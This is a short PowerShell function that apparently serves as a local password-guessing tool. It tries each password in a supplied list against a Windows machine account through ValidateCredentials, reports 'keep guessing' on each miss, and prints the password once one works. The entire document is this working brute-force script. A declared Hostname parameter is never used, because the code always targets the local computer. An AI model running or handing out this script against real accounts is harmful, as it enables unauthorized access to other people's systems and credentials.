function Validate-UserCredentials {
    param (
        [string] $Username,
        [string[]] $PasswordsToTry,
        [string] $Hostname = ($env:COMPUTERNAME)
    )

    foreach ($p in $PasswordsToTry)
    {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$env:COMPUTERNAME)
        $validateCreds = $DS.ValidateCredentials($Username, "$p")
        
        If ($validateCreds)
        {
            Write-Output "Found it!!"
            $p
            Break
        }
        else
        {
            Write-Output "Not it, keep guessing"
        }
    }
}

